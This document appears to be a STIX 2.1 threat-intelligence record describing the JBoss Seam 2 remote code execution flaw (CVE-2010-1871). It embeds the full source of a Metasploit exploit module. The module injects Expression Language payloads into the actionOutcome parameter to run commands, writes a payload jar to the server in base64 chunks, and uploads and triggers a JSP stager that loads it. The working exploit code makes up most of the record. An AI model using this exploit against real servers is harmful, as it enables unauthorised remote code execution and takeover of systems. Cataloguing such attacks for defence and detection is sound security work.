{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e078071e-f722-4f31-b2f7-4f264343a101",
    "created": "2024-08-14T17:08:33.350097Z",
    "modified": "2024-08-14T17:08:33.350101Z",
    "name": "JBoss Seam 2 File Upload and Execute",
    "description": " Versions of the JBoss Seam 2 framework < 2.2.1CR2 fails to properly sanitize inputs to some JBoss Expression Language expressions.  As a result, attackers can gain remote code execution through the application server.  This module leverages RCE to upload and execute a given payload.  Versions of the JBoss application server (AS) admin-console are known to be vulnerable to this exploit, without requiring authentication. Tested against JBoss AS 5 and 6, running on Linux with JDKs 6 and 7.  This module provides a more efficient method of exploitation - it does not loop to find desired Java classes and methods. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/jboss_seam_upload_exec.rb",
            "external_id": "jboss_seam_upload_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-1871"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=615956"
        },
        {
            "source_name": "reference",
            "url": "http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html"
        },
        {
            "source_name": "reference",
            "url": "http://archives.neohapsis.com/archives/bugtraq/2013-05/0117.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n    Rank = NormalRanking\n\n    include Msf::Exploit::Remote::HttpClient\n    include Msf::Auxiliary::Report\n    include Msf::Exploit::FileDropper\n\n\n    def initialize(info = {})\n        super(update_info(info,\n        'Name'                  => 'JBoss Seam 2 File Upload and Execute',\n        'Description'   => %q{\n            Versions of the JBoss Seam 2 framework < 2.2.1CR2 fails to properly\n            sanitize inputs to some JBoss Expression Language expressions.  As a\n            result, attackers can gain remote code execution through the\n            application server.  This module leverages RCE to upload and execute\n            a given payload.\n\n            Versions of the JBoss application server (AS) admin-console are\n            known to be vulnerable to this exploit, without requiring authentication.\n            Tested against JBoss AS 5 and 6, running on Linux with JDKs 6 and 7.\n\n            This module provides a more efficient method of exploitation - it\n            does not loop to find desired Java classes and methods.\n        },\n        'Author'                => [ 'vulp1n3 <vulp1n3[at]gmail.com>' ],\n        'References'            =>\n        [\n            # JBoss EAP 4.3.0 does not properly sanitize JBoss EL inputs\n            ['CVE', '2010-1871'],\n            ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=615956'],\n            ['URL', 'http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html'],\n            ['URL', 'http://archives.neohapsis.com/archives/bugtraq/2013-05/0117.html']\n        ],\n        'DisclosureDate' => '2010-08-05',\n        'License'               => MSF_LICENSE,\n        'Platform'              => %w{ java },\n        'Targets'               =>\n        [\n            [ 'Java Universal',\n                {\n                    'Arch' => ARCH_JAVA,\n                    'Platform' => 'java'\n                },\n            ]\n        ],\n        'DefaultTarget'       => 0\n        ))\n\n        register_options(\n        [\n            Opt::RPORT(8080),\n            OptString.new('AGENT',  [ true,  \"User-Agent to send with requests\", \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)\"]),\n            OptString.new('CTYPE',  [ true,  \"Content-Type to send with requests\", \"application/x-www-form-urlencoded\"]),\n            OptString.new('TARGETURI',  [ true,  \"URI that is built on JBoss Seam 2\", \"/admin-console/login.seam\"]),\n            OptInt.new('TIMEOUT', [ true, 'Timeout for web requests', 10]),\n            OptString.new('FNAME',  [ false,  \"Name of file to create - NO EXTENSION! (default: random)\", nil]),\n            OptInt.new('CHUNKSIZE', [ false, 'Size in bytes of chunk per request', 1024]),\n        ])\n    end\n\n\n    def check\n        vprint_status(\"#{rhost}:#{rport} Checking for vulnerable JBoss Seam 2\")\n        uri = target_uri.path\n        res = send_request_cgi(\n        {\n            'uri'       => normalize_uri(uri),\n            'method'    => 'POST',\n            'ctype'     => datastore['CTYPE'],\n            'agent'     => datastore['AGENT'],\n            'data' => \"actionOutcome=/success.xhtml?user%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime')}\"\n        }, timeout=datastore['TIMEOUT'])\n        if (res and res.code == 302 and res.headers['Location'])\n          vprint_status(\"Server sent a 302 with location\")\n          if (res.headers['Location'] =~ %r(public\\+static\\+java\\.lang\\.Runtime\\+java.lang.Runtime.getRuntime\\%28\\%29))\n            report_vuln({\n              :host => rhost,\n              :port => rport,\n              :name => \"#{self.name} - #{uri}\",\n              :refs => self.references,\n              :info => \"Module #{self.fullname} found vulnerable JBoss Seam 2 resource.\"\n            })\n            return Exploit::CheckCode::Vulnerable\n          else\n            return Exploit::CheckCode::Safe\n          end\n        else\n          return Exploit::CheckCode::Unknown\n        end\n\n        # If we reach this point, we didn't find the service\n        return Exploit::CheckCode::Unknown\n    end\n\n\n    def execute_cmd(cmd)\n        cmd_to_run = Rex::Text.uri_encode(cmd)\n        vprint_status(\"#{rhost}:#{rport} Sending command: #{cmd_to_run}\")\n        uri = target_uri.path\n        res = send_request_cgi(\n        {\n            'uri'       => normalize_uri(uri),\n            'method'    => 'POST',\n            'ctype'     => datastore['CTYPE'],\n            'agent'     => datastore['AGENT'],\n            'data' => \"actionOutcome=/success.xhtml?user%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime').invoke(expressions.getClass().forName('java.lang.Runtime')).exec('#{cmd_to_run}')}\"\n        }, timeout=datastore['TIMEOUT'])\n        if (res and res.code == 302 and res.headers['Location'])\n            if (res.headers['Location'] =~ %r(user=java.lang.UNIXProcess))\n                vprint_good(\"#{rhost}:#{rport} Exploit successful\")\n            else\n                vprint_error(\"#{rhost}:#{rport} Exploit failed\")\n            end\n        else\n            vprint_error(\"#{rhost}:#{rport} Exploit failed\")\n        end\n    end\n\n\n    def call_jsp(jspname)\n        # TODO ugly way to strip off last resource on a path\n        uri = target_uri.path\n        *keep,ignore = uri.split(/\\//)\n        keep.push(jspname)\n        uri = keep.join(\"/\")\n        uri = \"/\" + uri if (uri[0] != \"/\")\n\n        res = send_request_cgi(\n        {\n            'uri'       => normalize_uri(uri),\n            'method'    => 'POST',\n            'ctype'     => datastore['CTYPE'],\n            'agent'     => datastore['AGENT'],\n            'data' => \"sessionid=\" + Rex::Text.rand_text_alpha(32)\n        }, timeout=datastore['TIMEOUT'])\n        if (res and res.code == 200)\n            vprint_good(\"Successful request to JSP\")\n        else\n            vprint_error(\"Failed to request JSP\")\n        end\n    end\n\n\n    def upload_jsp(filename,jarname)\n        jsp_text = <<EOJSP\n<%@ page import=\"java.io.*\"\n%><%@ page import=\"java.net.*\"\n%><%\nURLClassLoader cl = new java.net.URLClassLoader(new java.net.URL[]{new java.io.File(request.getRealPath(\"/#{jarname}\")).toURI().toURL()});\nClass c = cl.loadClass(\"metasploit.Payload\");\nc.getMethod(\"main\",Class.forName(\"[Ljava.lang.String;\")).invoke(null,new java.lang.Object[]{new java.lang.String[0]});\n%>\nEOJSP\n        vprint_status(\"Uploading JSP to launch payload\")\n        status = upload_file_chunk(filename,'false',jsp_text)\n        if status\n            vprint_status(\"JSP uploaded to to #{filename}\")\n        else\n            vprint_error(\"Failed to upload file.\")\n        end\n\n        @pl_sent = true\n    end\n\n\n    def upload_file_chunk(filename, append='false', chunk)\n        # create URL-safe Base64-encoded version of chunk\n        b64 = Rex::Text.encode_base64(chunk)\n        b64 = b64.gsub(\"+\",\"%2b\")\n        b64 = b64.gsub(\"/\",\"%2f\")\n\n        uri = target_uri.path\n        res = send_request_cgi(\n        {\n            'uri'       => normalize_uri(uri),\n            'method'    => 'POST',\n            'ctype'     => datastore['CTYPE'],\n            'agent'     => datastore['AGENT'],\n            'data' => \"actionOutcome=/success.xhtml?user%3d%23{expressions.getClass().forName('java.io.FileOutputStream').getConstructor('java.lang.String',expressions.getClass().forName('java.lang.Boolean').getField('TYPE').get(null)).newInstance(request.getRealPath('/#{filename}').replaceAll('\\\\\\\\\\\\\\\\','/'),#{append}).write(expressions.getClass().forName('sun.misc.BASE64Decoder').getConstructor(null).newInstance(null).decodeBuffer(request.getParameter('c'))).close()}&c=\" + b64\n        }, timeout=datastore['TIMEOUT'])\n        if (res and res.code == 302 and res.headers['Location'])\n            # TODO Including the conversationId part in this regex might cause\n            # failure on other Seam applications.  Needs more testing\n            if (res.headers['Location'] =~ %r(user=&conversationId))\n                #vprint_status(\"#{rhost}:#{rport} Exploit successful.\")\n                return true\n            else\n                #vprint_status(\"#{rhost}:#{rport} Exploit failed\")\n                return false\n            end\n        else\n            #vprint_status(\"#{rhost}:#{rport} Exploit failed\")\n            return false\n        end\n    end\n\n\n    def get_full_path(filename)\n        uri = target_uri.path\n        res = send_request_cgi(\n        {\n            'uri'       => normalize_uri(uri),\n            'method'    => 'POST',\n            'ctype'     => datastore['CTYPE'],\n            'agent'     => datastore['AGENT'],\n            'data' => \"actionOutcome=/success.xhtml?user%3d%23{request.getRealPath('/#{filename}').replaceAll('\\\\\\\\\\\\\\\\','/')}\"\n        }, timeout=datastore['TIMEOUT'])\n        if (res and res.code == 302 and res.headers['Location'])\n            # the user argument should be set to the result of our call - which\n            # will be the full path of our file\n            matches = /.*user=(.+)\\&.*/.match(res.headers['Location'])\n            if (matches and matches.captures)\n                return Rex::Text::uri_decode(matches.captures[0])\n            else\n                return nil\n            end\n        else\n            return nil\n        end\n  end\n\n\n    def java_stager(fname, chunk_size)\n        @payload_exe = fname + \".jar\"\n        jsp_name = fname + \".jsp\"\n\n        #data = payload.encoded_jar.pack\n        data = payload.encoded_jar.pack\n\n        append = 'false'\n        while (data.length > chunk_size)\n          status = upload_file_chunk(@payload_exe, append, data[0, chunk_size])\n          if status\n            vprint_status(\"Uploaded chunk\")\n          else\n            vprint_error(\"Failed to upload chunk\")\n            break\n          end\n          data = data[chunk_size, data.length - chunk_size]\n          # first chunk is an overwrite, afterwards, we need to append\n          append = 'true'\n        end\n        status = upload_file_chunk(@payload_exe, 'true', data)\n        if status\n            vprint_status(\"Payload uploaded to \" + @payload_exe)\n        else\n            vprint_error(\"Failed to upload file.\")\n        end\n\n        # write a JSP that can call the payload in the jar\n        upload_jsp(jsp_name, @payload_exe)\n\n        pe_path = get_full_path(@payload_exe) || @payload_exe\n        jsp_path = get_full_path(jsp_name) || jsp_name\n        # try to clean up our stuff;\n        register_files_for_cleanup(pe_path, jsp_path)\n\n        # call the JSP to launch the payload\n        call_jsp(jsp_name)\n    end\n\n    def exploit\n        @pl_sent = false\n\n        if check == Exploit::CheckCode::Vulnerable\n\n            fname = datastore['FNAME'] || Rex::Text.rand_text_alpha(8+rand(8))\n\n            vprint_status(\"#{rhost}:#{rport} Host is vulnerable\")\n            vprint_status(\"#{rhost}:#{rport} Uploading file...\")\n\n            # chunking code based on struts_code_exec_exception_delegator\n            append = 'false'\n            chunk_size = datastore['CHUNKSIZE']\n            # sanity check\n            if (chunk_size <= 0)\n                vprint_error(\"Invalid chunk size #{chunk_size}\")\n                return\n            end\n\n            vprint_status(\"Sending in chunks of #{chunk_size}\")\n\n            case target['Platform']\n            when 'java'\n                java_stager(fname, chunk_size)\n            else\n                fail_with(Failure::NoTarget, 'Unsupported target platform!')\n            end\n\n            handler\n        end\n    end\nend\n\n",
    "x_mitre_disclosure_date": "2010-08-05",
    "x_mitre_platforms": [
        "java"
    ]
}